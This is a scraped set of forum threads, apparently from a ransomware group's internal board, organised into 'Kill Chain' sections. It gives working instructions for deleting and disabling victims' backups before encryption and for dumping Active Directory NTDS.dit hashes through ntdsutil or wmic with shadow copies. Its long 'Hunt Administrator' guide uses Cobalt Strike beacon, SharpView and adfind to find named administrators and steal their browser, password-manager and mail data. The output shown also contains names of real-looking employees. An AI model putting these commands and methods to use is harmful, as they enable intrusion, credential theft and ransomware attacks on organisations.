+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : May 28, 2021, 10:01:45 pm
+Recorded by
+
+in fact, it’s easier than with the sphere and proxmox, we fly into the virtuoso management manager, look in it where are the cars (Shares, AD) and compare with the list that was removed, if the entire infrastructure is on virtual machines, then just turn off all the cars in the manager, then in panel administrators in roles, turn off the hipster service and locate the server with all the virtuoso backs (if there are no separate hardware (external) snapshots (it’s better to take snapshots instead of deleting them, unlike the VFMS of the sphere file system), if we just delete the snapshot, then you can restore it through utilities like get data back or easy recovery).
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+Hyper V
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+vSphere
+
+vSphere
+Rozetka · 2 · 32
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:56:21 pm
+Recorded by
+
+piu
+
+Tyr
+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : May 28, 2021, 09:54:18 pm
+Recorded by
+
+Fresh spheres have moved away from Java and clients, and work on pure HTML5.
+The first thing we can check regarding backs is to check if the SSH and Console Shell services are enabled. Without them, at least backup in synology is impossible.
+In the left menu of the Navigator, click on Host and see the summary information. As a rule, there are 2 warnings in the middle of the screen.
+The ESXi shell is enabled on this host. You should disable the shell unless it is necessary for administrative purposes.
+SSH is enabled on this host. You should disable SSH unless it is necessary for administrative purposes.
+Additionally, you can see the Action > Services button at the top. If there we will be asked to turn off these services, then they are definitely turned on and the backs go to a third-party wheelbarrow.
+
+Additionally, you can go to the Host tab in its internal Manage tab and open the Licensing item there. We look at what license costs, if it's free
+then the backup, if it is done, is definitely not Veem, since a license for the sphere itself is required here.
+
+Further we check where backups pour. Also on the left in the host, open the Monitor tab, in the middle of it, the Logs tab. In the logs we find /var/log/vmauthd.log
+And we look from which ip who logged in, as a rule, backs are made at night, respectively, we look at connections from 11 am to 7 am.
+Here is an example of a successful authorization of a backer on a sphere
+2021-05-02T00:03:07Z vmauthd[6822812]: Connect from remote socket (tut.ip.servera.backup:48280).
+2021-05-02T00:03:07Z vmauthd[6822812]: Connect from tut.ip.servera.backup
+
+The sphere is also often fucked by a botnet, so we ignore conclusions like
+2021-05-01T05:19:27Z vmauthd[6788606]: Connect from remote socket (185.165.190.17:46546).
+2021-05-01T05:19:27Z vmauthd[6788606]: Connect from 185.165.190.17
+2021-05-01T05:19:29Z vmauthd[6788606]: recv() FAIL: 1. <<<<<<<<< here, note that FAIL means someone tried to snuggle but ate tuna.
+
+You can see all the admins of the sphere on the main Host tab, Actions at the top right and the Permissions item.
+
+In addition to backups, snapshots are sometimes stored in the sphere, they can be safely viewed and deleted in the tab. On the left is Virtual Machines. We select a virtual wheelbarrow, in it at the top right, the Actions tab
+and the Snapshots menu item. If the Restore snapshot tab is active, then there are snapshots, open the Manage snapshots tab and there we can delete them, when deleting the delta file is also deleted
+and further recovery from the VFMS file system, I xs, have not met.
+
+
+
+So we found the Synology server and have access to it.
+Backups are usually made by Active Backup for Business software. It is free, flexible and standard))
+
+One thing, but with a probability of 99% we will fire up as the admins will receive mail and push notifications that everything is gone) Therefore, we go to
+Control Panel > Notifications > Advanced and there in the ABB service we remove all the buttons for sending notifications. Up to the heap, you can basically turn off all notifications.
+
+Open ABB, open the Virtual Machine tab in it and see all the hosts and their virtual machines that are being backed up.
+To delete them, open the Tasks tab at the top and delete backup tasks in it, he will swear that this is dangerous and delete backups,
+understanding all the risks of loss, we agree and wait until he deletes)
+
+In general, you can delete backups, then encrypt virtual machines, and roll fresh backups with broken virtual machines, and set the task to make a backup once an hour in order to clean the disk
+
+You can also see if the docker is worth it, they can also virtualize in it.
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+vSphere
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+final phase »
+Mass change of passwords for users
+
+Mass change of passwords for users
+Rozetka · 1 · 34
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:56:51 pm
+Recorded by
+
+vzhuh and atatata
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+final phase »
+Mass change of passwords for users
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+final phase »
+Change RDP port
+
+Change RDP port
+Rozetka · 1 · 39
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:57:06 pm
+Recorded by
+
+vzhuh atatatat
+PSH CODE >
+Quote
+
+# add firewall rules
+New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol TCP -Action allow
+New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol UDP -Action allow
+# add to registry new port
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name PortNumber -Value 1350
+#powershell
+Restart-Service termservice -force
+
+« Last Edit: February 11, 2021, 03:03:12 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+final phase »
+Change RDP port
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+EMC
+
+EMC
+Rozetka · 2 · 26
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:57:44 pm
+Recorded by
+
+and storeyji here we also add a work \ description with them?...
+
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+Reply #1 : February 12, 2021, 12:14:05 pm
+Recorded by
+
+yes, of course, where you mainly work with guy - it is desirable with screenshots
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+EMC
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+NTDS Dumping
+
+NTDS Dumping
+Rozetka · 2 · 97
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 03:06:00 pm
+Recorded by
+
+on PDC RUN from SYS / ADMIN
+Quote
+
+ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\Crashpad\Temp\abc" qq
+
+
+
+and use for decrypt
+Code: [Highlight]
+
+https://github.com/Dionach/NtdsAudit
+
+Quote
+
+ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv
+
+5 sec and you get all hashes
+vjyh!
+
+Which alternative is EVEN QUIETER?
+
+t3chnolog
+
+Administrator
+Member
+*****
+one
+View Profile E-mail Private Message (Offline)
+
+Answer #1 : February 19, 2021, 03:15:50 pm
+Recorded by
+
+Code: [Highlight]
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
+almost certainly they are already there, if not, we do it ourselves
+Code: [Highlight]
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+further in the listing of shadow copies we find the latest
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+accordingly we need a copy number for the next command
+Code: [Highlight]
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"
+
+
+in c:\temp\log\ files ntds.dit / security / system should fall
+we take a portable console 7z and pack it into an archive with a password
+Code: [Highlight]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following
+Code: [Highlight]
+
+Esentutl /p C:\log\ntds.dit
+
+
+the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
+in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive
+
+if you have troubles with what they fire and throw out of the network after the ntds dump - try this method
+it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+NTDS Dumping
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Citrix
+
+Citrix
+Alter 2 36
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 10:59:41 am
+Recorded by
+
+Post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Answer #1 : March 15, 2021, 01:58:27 am
+Recorded by
+
+Trying to get into any application and find File > Open
+Open C:\Windows\System32\cmd.exe
+We ask local administrators and somehow start further .... Ask your team leader :)
+Through the help you can also get a shell
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Citrix
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Credentials Dumping »
+Hunt Administrator
+
+Hunt Administrator
+Rozetka · 2 · 79
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 03:07:32 pm
+Recorded by
+
+poof
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : February 11, 2021, 03:08:03 pm
+Recorded by
+
+Hunt admin.
+
+And so, if we have servers \ US \ tapes or cloud storages where backups are added, but there is no access, then we need credits that only the admin has.
+Accordingly, we need to hunt him down. Usually in those networks where we work admins 1-2-3, no more.
+People are divided into 3 types:
+
+Senior
+Medium
+Junior
+
+Of course, we are interested in seniors because they have more privileges/accesses (read passwords).
+
+
+To begin with, I will write several options for how to determine the accounts of the very administrators who have passwords on board.
+
+Part 1::
+Option number 1:
+Poll YES
+
+```
+
+beacon> shell net group "domain admins" /domain
+
+Tasked beacon to run: net group "domain admins" /domain
+host called home, sent: 64 bytes
+received output:
+
+
+La demande sera traitée sur contrôleur de domaine du domaine DOMAIN.com.
+
+Nom de groupe Domain Admins
+Commentaire Designated administrators of the domain
+
+Membres
+
+-------------------------------------------------- ------------------------------
+Administrator ClusterSvc createch
+Createch2 d01adm da9adm
+p01adm PMPUser q01adm
+repl s01adm Sapserviced01
+SAPServiceDA9 sapservicep01 SAPServiceQ01
+sapservices01 SAPServiceSND SAPServiceSOL
+services services2 sndadm
+soladm somadm staseb
+telnet Johnadm
+La commande s'est terminee correctement.
+
+```
+
+We look and filter service accounts and non-service accounts with our eyes.
+Service from the list above is for example
+```
+SAPServiceDA9
+services
+telnet
+services2
+Sapservice01
+...
+
+```
+
+Which accounts are MOST suitable for us:
+```staseb
+Johnadm
+```
+
+They were recorded.
+
+We can see who they are in adfind_persons.txt
+
+or via command
+```shell net user staseb /domain
+```
+
+See example:
+```
+
+beacon> shell net user ebernardo /domain
+
+Tasked beacon to run: net user ebernardo /domain
+host called home, sent: 57 bytes
+received output:
+
+
+User name ebernardo
+Full Name Eric Bernardo
+Comment
+User's comment
+Country/region code (null)
+Account active Yes
+Account expires Never
+
+Password last set 2020-12-08 12:05:15 PM
+Password expires 2021-06-06 12:05:15 PM
+Password changeable 2020-12-08 12:05:15 PM
+Password requiredYes
+User may change password Yes
+
+Workstations allowed All
+logon script
+user profile
+home directory
+Last logon 2021-01-29 02:25:24 PM
+
+Logon hours allowed All
+
+Local Group Memberships *Administrators *Remote Desktop Users
+*Server Operators
+Global Group memberships *US Users *Great Plains Users
+*Citrix Group *VPN Users Saskatoon
+*Admins - AD Basic *VPNUsersHeadOffice
+*Executives *All Winnipeg Staff
+*Scribe Console Users *Domain Admins
+*VPN Users USA *Workstation.admins
+*Domain Users
+The command completed successfully.
+
+```
+
+We look who is - included in a dozen groups, SOMETIMES in the Comment column they write who they are - engineer \ sys admin \ support \ business consultant.
+in Last Logon, the account must be ACTIVE - that is, last logon today\yesterday\this week, but not a year ago or Never.
+If it is not clear who this is after the survey, see adfind + check linkedin (section below).
+
+So 2-3-5 accounts, as a result, you pull out the admins from the domain and interrogate everyone and should have an idea who it is. As a result of 1-2-3 accounts, it turns out to find who can be an administrator.
+
+
+Option #2:
+Turning into home analysts - watching Adfind.
+We are interested in the adfind_groups file
+We go, we see a bunch of text
+Press Ctrl + F (Notepad2 / Geany)
+Enter
+```dn:CN=
+```
+And the Find All in current document button.
+      
+at the output we get APPROXIMATELY the following (I cut out a piece and left 10-20 lines, usually there are from 100 to 10000 lines)
+```
+      
+adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
+adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com
+adfind_groups:3800: dn:CN=Signature Intl-Special,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:3829: dn:CN=FIMSyncAdmins,CN=Users,DC=domain,DC=com
+adfind_groups:3852: dn:CN=GRP-GRAPHISTE,OU=FG-GRP,DC=domain,DC=com
+adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+adfind_groups:3902: dn:CN=MSOL_AD_Sync_RichCoexistence,CN=Users,DC=domain,DC=com
+adfind_groups:3925: dn:CN=WinRMRemoteWMIUsers__,CN=Users,DC=domain,DC=com
+adfind_groups:3946: dn:CN=EDI,CN=Users,DC=domain,DC=com
+adfind_groups:3967: dn:CN=Signature Canada,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com
+
+```
+      
+And so, we have extracted the active directory groups.
+What is interesting for us here and why we did it - in active directroy everything is structured and in USA EU networks everything is made as clear as possible transparently with comments, notes, copywriting, etc.
+We have an interesting group that deals with IT, administration, LAN engineering.
+What we got after the search - we put it in a new notebook and do a search for the following key words:
+```
+IT
+Admin
+engineer
+-----
+```
+      
+In the example above we find the following line
+```
+adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+```
+      
+We follow line 3877 in adfind_Groups.txt and see the following:
+```
+      
+dn:CN=IT,CN=Users,DC=domain,DC=com
+>objectClass: top
+>objectClass: group
+>cn: IT
+>description: Informatique
+>member: CN=MS Surface,OU=IT,DC=domain,DC=com
+>member: CN=Gyslain Petit,OU=IT,DC=domain,DC=com
+>member: CN=ftp,CN=Users,DC=domain,DC=com
+>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
+```
+
+We skip ftp and MS Surface users, but we take Gyslain Petit and St Amand Sebastien into circulation.
+Next, open ad_users.txt
+Introducing Gyslain Petit
+Find a user with the following information:
+```
+
+dn:CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>objectClass: top
+>objectClass: person
+>objectClass: organizationalPerson
+>objectClass: user
+>cn: Gyslain Petit
+>sn: Petite
+>title: Directeur, technologie de l'information
+>physicalDeliveryOfficeName: 217
+>givenName: Gyslain
+>distinguishedName: CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>instanceType: 4
+>whenCreated: 20020323153742.0Z
+>whenChanged: 20201212071143.0Z
+>displayName: Gyslain Petit
+>uSNCreated: 29943
+>memberOf: CN=GRP_Public_USA_P,OU=Securite-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-LDAP-VPN,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=IT Support,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=Directeurs,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-IT,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=Signature Canada,OU=Groupes,OU=Infra,DC=trudeaucorp,DC=com
+>memberOf: CN=EDI,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=IT,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=TRUDEAU-MONTREAL,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=everyone,CN=Users,DC=trudeaucorp,DC=com
+>uSNChanged: 6908986
+>department: IT manager
+```
+We look at the title and who is it here? Information Technology Director. It would seem to be a bull's-eye, but the director does not always have passwords, but some kind of System Administrator does.
+Therefore, for the second user and more, we carry out similar manipulations. We (= in the conf) take notes on who is who and write down the logins from adfind (sAMAccountname) like this:
+```>sAMAccountName: gpetit
+```
+
+```
+gpetit - Director of IT
+staseb - such and such
+```
+
+
+The second part of option No. 2 (Simplified):
+We look initially in adfind_users.txt
+Doing a search by
+```title:
+description
+departament
+```
+If you're lucky, the positions will be directly written there. In my test case it looks like this:
+
+```
+adfind_persons:280: >title: Responsible, logistique direct import
+adfind_persons:1836: >title: Chef des services techniques
+adfind_persons:1955: >title: Chef comptable
+adfind_persons:4544: >title: Directeur, technologie de l'information
+adfind_persons:6064: >title: Presidente
+adfind_persons:6191: >title: Chargee de projets, mise en marché
+adfind_persons:6285: >title: Directrice marketing
+adfind_persons:6848: >title: Coordonnatrice à la logistique
+adfind_persons:6948: >title: Responsible de l'expedition
+```
+
+Accordingly, we run through the eyes and the accounts are found.
+
+
+And so, these are easy methods. Consider alternative searches for admin accounts.
+I know so far only 1 simple method - linkedin
+Putting a query into google
+```
+OURSACRIFICE.COM linkedin
+```
+instead of a domain - insert the domain of the office.
+
+Go to Members
+Do a search there
+```
+System
+Admin
+Engineer
+network
+It
+```
+If someone has a first name + last name, then we drive it into adfind and the account is found.
+If you know more efficient methods - please write to @rozetka
+
+And so, part 1 is finished.
+
+Getting to the admin hunt and inspection
+
+Part #2:
+Hunt admin standard via SharpView
+You can take SharpView.exe in the conference from your team leaders or from the software conf
+The hunt command is:
+Linux
+```
+execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+On Windows >
+```
+execute-assembly C:\Users\Andrew\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+
+where gpetit is the account of the person we are looking for. what is written in adfinusers in sAMAccountname - we insert it here.
+
+As a result, we get the following log:
+
+```
+
+UserDomain : domain
+UserName : gpetit
+ComputerName : DC01.domain.LOCAL
+IPAddress : 172.16.1.3
+SessionFrom : 192.168.100.55
+SessionFromName :
+LocalAdmin :
+
+UserDomain : domain
+UserName : gpetit
+ComputerName : SQL01.domain.LOCAL
+IP Address : 172.16.1.30
+SessionFrom : 192.168.100.55
+SessionFromName :
+LocalAdmin :
+
+UserDomain : domain
+UserName : gpetit
+ComputerName : lptp-gpetit.domain.LOCAL
+IPAddress : 172.16.1.40
+SessionFrom : 192.168.100.55
+SessionFromName :
+LocalAdmin :
+
+```
+
+
+And so, the log will be of an approximate format, how should we deal with it -
+Firstly, how the software works - it asks where the user is at least somehow authorized at the moment. And our user is not simple - he is an administrator and at some point he can be authorized on 20-30-50 servers.
+How can we filter and not get bogged down in it?
+First, we remove the OS that we are not interested in
+for example, the first DC01 in the list is clearly DomainController01, you can check it by adfind_computers.txt or portscan 172.16.1.13 and see that this is a SERVER OS. And we need a client.
+The second one is SQL01 - DB OS. It doesn't suit us.
+We look at the third - lptp-gpetit. Hmm, our username is gpetit, and lptp means laptop. Maybe it's just him.
+#It also happens that the admin is connected ONLY to the server OS, but in the SessionFrom column - IP from another subnet (for example vpn sabnet) where he sits quietly but SharpView did not "take" him - can also be taken into circulation.
+Next - IMPORTANT POINT.
+First of all, beginners try to raise a session there and VERY OFTEN catch an alert. Alert at the admin = sawing out of the network, loss of time, nerves. Do NOT do this!
+What we are going to do is poll it through the file system.
+We do the following
+```shell net view \\172.16.1.40 /ALL
+```
+
+At the output, we see its local wilds
+```
+C$
+D$
+```
+Shoeing a token (It is a token that is recommended, because pth leaves a slightly different Event ID on the domain controller, and the admin can notice this and cut us out)
+
+Open File Manager in cobalt:
+```\\172.16.1.40\c$
+```
+
+or use the shell via
+```
+shell dir \\172.16.1.40\c$```
+
+Let's see what's on the C drive
+Go to folder
+```\\172.16.1.40\c$\Users\gpetit
+```
+
+Usually if it's REALLY an admin workstation - it has a lot of junk ala Virtualbox / putty / winscp etc etc etc
+
+How do we "inspect" it, here is a list of interesting directories:
+
+Desktop
+```\\172.16.1.40\c$\Users\gpetit\Desktop
+```
+```
+\\172.16.1.40\c$\Users\gpetit\OneDrive
+\\172.16.1.40\c$\Users\gpetit\Downloads
+\\172.16.1.40\c$\Users\gpetit\Desktop
+\\172.16.1.40\c$\Users\gpetit\Documents
+
+```
+Here are folders with custom configurations, below is a list of what can be extracted:
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local
+```
+
+```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
+```
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
+```
+Here lies History && Login Data from chrome.
+History can be directly downloaded and viewed using DBrowser for SQLite(nix win). What is useful is to see where the admin goes, who he votes for, you can sort the history by title and find the NAS / Tape / vSphere directly, etc. VERY useful stuff.
+Login Data - are logins and passwords. Encrypted(!). If it weighs 38-42kb then it is EMPTY. If it weighs more than 40-45kb (from 100kb to 1-2 megabytes) - then there are EXACTLY passwords there. If there is a required URL with a saved password, contact your team leader.
+It also happens in chrome that there are no passwords in the Login Date, but if you carefully examine the profile folder, there will be an extensions folder and lastpass there. This can also happen in practice - in this case, log in via RDP at night and export passwords (either a keylogger or other options)
+
+Similarly, you can see the Firefox / Edge folder (I will add the paths, they are easy to google)
+
+Also, system administrators FREQUENTLY meet the following folders in AppData\Roaming && AppData\Local:
+```Keepass
+LastPass
+```
+their configs are there. We drag them, put them in the conf. if this is found, it means MOST MOSTLY there is a mass of exactly THE MOST necessary passwords.
+
+It also happens that the admin stores ala right on the desktop
+```access.xlsx
+passwords.docx
+```
+We swing, we break, we look.
+
+there is also an outlook folder
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
+```
+Here is the file ala
+```gpetit@domain.com - Exchange1.ost
+```
+In it is the CORRESPONDENCE of this pepper. You can download it to yourself, open the free ost viewer and see the mail entry / exit. REGULARLY it can be useful to understand difficult situations using this technique.
+It is copied simply - we cut down outlook.exe, we make a copy-paste of the .ost file, then the user will open outlook for himself.
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
+\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
+```
+Here the sitemanager.xml files can be with FTP SSH creds. We swing, we look, we throw in a conf.
+
+
+We also examine \\172.16.1.40\C$\ProgramData
++Program files / x86
++ Local drives that dropped out in net view \\host /ALL
+D$ etc
+
+Also in ad_users.txt there is a homeDir - we also look at it, study it.
+
+
+Look like that's it.
+
+Why the manual was written - so as not to try headlong to go raise the session and catch alerts from the admin.
+Our job is rather to figure out what works, rather than setting up brute force for all kinds of access.
+Everything is already hacked, you just need to look at everything! through the eyes of the administrator!
+The main task for the admin hunt is to understand where he stores passwords and steal the database \ exelka \ file \ textbook \ document
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Credentials Dumping »
+Hunt Administrator
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+powerupsql
+
+powerupsql
+Rozetka · 3 · 41
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 03:09:57 pm
+Recorded by
+
+https://github.com/NetSPI/PowerUpSQL/wiki
+who it can show for us
+« Last Edit: February 12, 2021, 07:56:37 pm by Alter »
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : Jul 01, 2021, 02:26:34 am
+Recorded by
+
+
+NetSpi PowerSQL::
+one.
+https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
+powershell-import /home/user/soft/scripts/powerupsql.ps1
+
+2.
+
+beacon> psinject 33700 x64 Get-SQLInstanceDomain -Verbose
+
+Tasked beacon to psinject: Get-SQLInstanceDomain -Verbose into 33700 (x64)
+host called home, sent: 134785 bytes
+received output:
+
+
+VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)...
+VERBOSE: Parsing SQL Server instances from SPNs...
+VERBOSE: 5 instances were found.
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #2 : Jul 02, 2021, 04:33:07 pm
+Recorded by
+
+From vpn it also works through (grabbing skl servers in the domain)
+Quote
+
+runas /netonly /user:domain.local\user powershell_ise
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+powerupsql
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Sorting adfind Linux
+
+Sorting adfind Linux
+Rozetka · 1 · 26
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 03:11:42 pm
+Recorded by
+
+Put next to ad_computers.txt
+Quote
+
+#!/bin/bash
+
+F1INPATH="ad_computers.txt"
+F2INPATH="ad_users.txt"
+F2OUTPATH="ad_users_result.txt"
+
+while readp; do
+
+if [[ ${p:0:17} == ">operatingSystem:" ]]; then
+OSPATH=${p:18}
+fi
+     
+if [[ ${p:0:13} == ">dNSHostName:" ]]; then
+if [[ ${OSPATH:0:14} == "Windows Server" ]]; then
+echo ${p:14} >> "SERVERS.txt"
+tmp=$(echo "$OSPATH" | cut -d' ' -f1-3)
+echo ${p:14} >> "$tmp.txt"
+else
+echo ${p:14} >> "WORKERS.txt"
+tmp=$(echo "$OSPATH" | cut -d' ' -f1-2)
+echo ${p:14} >> "$tmp.txt"
+fi
+fi
+     
+done < $F1INPATH
+
+
+
+while readp; do
+
+if [[ ${p:0:13} == ">description:" ]]; then
+DECR=${p:14}
+DECR=${DECR%$'\r'}
+fi
+
+if [[ ${p:0:16} == ">sAMAccountName:" ]]; then
+ACCNAME=${p:17}
+ACCNAME=${ACCNAME%$'\r'}
+echo "$ACCNAME:$DECR" >> "$F2OUTPATH"
+fi
+     
+     
+     
+done < $F2INPATH
+
+
+Press chmod +x script.sh
+./script.sh
+
+At the output of WORKERS - win7-10
+and SEVERS 2003-20xx
+MAC OS and other device separately
+Very comfortably. Works under Linux
+
+from Steven
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Sorting adfind Linux
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
